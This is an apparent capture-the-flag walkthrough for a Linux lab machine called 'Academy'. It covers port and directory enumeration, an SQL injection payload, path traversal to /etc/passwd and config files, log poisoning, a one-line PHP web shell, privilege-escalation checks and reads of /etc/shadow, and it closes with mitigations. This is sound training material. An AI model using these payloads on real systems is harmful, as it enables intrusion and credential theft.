# Academy Walkthrough

## Overview
The "Academy" machine focuses on web application vulnerabilities, directory traversal, credential harvesting, and privilege escalation techniques on a Linux system. This walkthrough covers the complete process of attacking and gaining control of the Academy machine.

## Reconnaissance and Enumeration

### Initial Nmap Scan
```bash
nmap -sV -sC -p- --min-rate 5000 <target_ip>
```

**Key findings:**
- Port 22: SSH
- Port 80: HTTP (Apache)
- Port 33060: MySQL
- Linux-based target

### Web Application Enumeration

1. **Directory Enumeration**:
   ```bash
   gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
   ```

   **Key findings:**
   - `/index.php`: Main page
   - `/login.php`: Login portal
   - `/register.php`: Registration page
   - `/admin/`: Admin directory (403 Forbidden)
   - `/images/`: Image directory
   - `/includes/`: Backend files

2. **Nikto Scan**:
   ```bash
   nikto -h http://<target_ip>
   ```

3. **Manual Exploration**:
   - Register a new user account
   - Note the functionality of the site
   - Review source code for comments and hidden information

## Vulnerability Analysis

### Login Page Testing

1. **SQL Injection Testing**:
   - Try payloads like `' OR 1=1 --`
   - Test for error-based SQL injection

2. **Authentication Bypass Testing**:
   - Attempt common username/password combinations
   - Check for weak credentials

### File Inclusion Vulnerabilities

1. **Test for LFI (Local File Inclusion)**:
   - Try accessing `/index.php?page=../../../etc/passwd`
   - Test different path traversal techniques

2. **Test for RFI (Remote File Inclusion)**:
   - Attempt to include remote files via URL

## Initial Exploitation

### Exploiting Local File Inclusion

1. **Confirm LFI vulnerability**:
   - Navigate to: `http://<target_ip>/index.php?page=../../../etc/passwd`
   - Verify system users are disclosed

2. **Extract sensitive files**:
   - Access configuration files: `http://<target_ip>/index.php?page=../../../var/www/html/config.php`
   - Look for database credentials

3. **Access log poisoning (if applicable)**:
   - Try to poison logs with PHP code via User-Agent string
   - Include log files to execute injected code

### Credential Harvesting

1. **Extract database credentials from config files**:
   - Look for username, password, database name

2. **Connect to MySQL (if accessible)**:
   ```bash
   mysql -h <target_ip> -u <discovered_username> -p
   ```

3. **Extract user credentials from database**:
   ```sql
   SHOW DATABASES;
   USE <database_name>;
   SHOW TABLES;
   SELECT * FROM users;
   ```

## Gaining Access

### Method 1: Login with Harvested Credentials

1. **Try harvested credentials on login page**
2. **Try the same credentials for SSH access**:
   ```bash
   ssh <username>@<target_ip>
   ```

### Method 2: Web Shell Upload (if available)

1. **Create PHP web shell**:
   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. **Upload shell through vulnerable function**
3. **Execute commands**:
   ```
   http://<target_ip>/uploads/shell.php?cmd=id
   ```

## Privilege Escalation

### Basic Enumeration

1. **Check current user privileges**:
   ```bash
   id
   sudo -l
   ```

2. **Automated enumeration**:
   ```bash
   # Download LinPEAS
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

### Privilege Escalation Vectors

1. **SUID Binaries**:
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Cron Jobs**:
   ```bash
   cat /etc/crontab
   ls -la /etc/cron*
   ```

3. **Kernel Exploits**:
   ```bash
   uname -a
   # Search for kernel exploits based on version
   ```

4. **Sudo Rights**:
   ```bash
   sudo -l
   # Exploit specific sudo permissions using GTFOBins
   ```

5. **Misconfigured Permissions**:
   ```bash
   find / -writable -type d 2>/dev/null
   ```

### Root Access

1. **Execute privilege escalation**:
   - Based on findings, implement appropriate technique
   - Examples:
     - Exploiting SUID binary
     - Abusing sudo permissions
     - Exploiting a writeable script in cron

2. **Verify root access**:
   ```bash
   id
   whoami
   ```

## Capturing Flags

1. **User flag**:
   ```bash
   find / -name user.txt 2>/dev/null
   cat /home/<username>/user.txt
   ```

2. **Root flag**:
   ```bash
   find / -name root.txt 2>/dev/null
   cat /root/root.txt
   ```

## Post-Exploitation

1. **Gather sensitive information**:
   ```bash
   cat /etc/shadow
   history
   ```

2. **Network enumeration**:
   ```bash
   netstat -tuln
   ip a
   ```

3. **Additional user enumeration**:
   ```bash
   cat /etc/passwd
   ls -la /home/
   ```

## Mitigation Recommendations

If this were a real engagement, recommend:

1. **Input Validation**: Implement proper input validation to prevent LFI/RFI
2. **Secure Coding Practices**: Follow secure coding guidelines for web applications
3. **Web Application Firewall**: Deploy WAF to filter malicious requests
4. **Principle of Least Privilege**: Ensure users and services run with minimal privileges
5. **Regular Updates**: Keep all software components updated
6. **Secure Configuration**: Disable unnecessary features and services
7. **Strong Authentication**: Implement strong password policies and MFA

## Lessons Learned

- File inclusion vulnerabilities can lead to information disclosure
- Improperly secured configuration files may expose sensitive credentials
- Privilege escalation often stems from misconfigurations
- Web applications require thorough security testing
- Defense in depth is essential for protecting sensitive information
